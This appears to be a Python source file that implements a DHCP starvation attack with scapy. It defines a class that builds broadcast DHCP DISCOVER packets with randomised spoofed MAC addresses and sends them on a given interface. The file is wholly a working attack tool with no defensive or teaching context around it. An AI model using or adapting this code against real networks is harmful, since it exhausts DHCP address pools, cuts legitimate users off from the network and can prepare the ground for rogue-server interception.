from scapy.all import *


class DhcpStarvationAttack:
    def __init__(self, network_interface = str):
        self.network_interface = network_interface
        self.count_send_packets = 1

    def get_status_attack(self) -> bool:
        dhcp_discover = self.__build_dhcp_discover_packet()
        try:
            sendp(dhcp_discover, iface=self.network_interface, verbose=1, count=self.count_send_packets)
            return True
        except Exception as Error:
            return False

    def __build_dhcp_discover_packet(self):
        conf.checkIPaddr = False  # Disabling the IP address checking
        # Building the DISCOVER packet
        # Making an Ethernet packet
        dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
                    / IP(src='0.0.0.0', dst='255.255.255.255') \
                    / UDP(dport=67,sport=68) \
                    / BOOTP(op=1, chaddr=RandMAC()) \
                    / DHCP(options=[('message-type','discover'), ('end')])
        return dhcp_discover
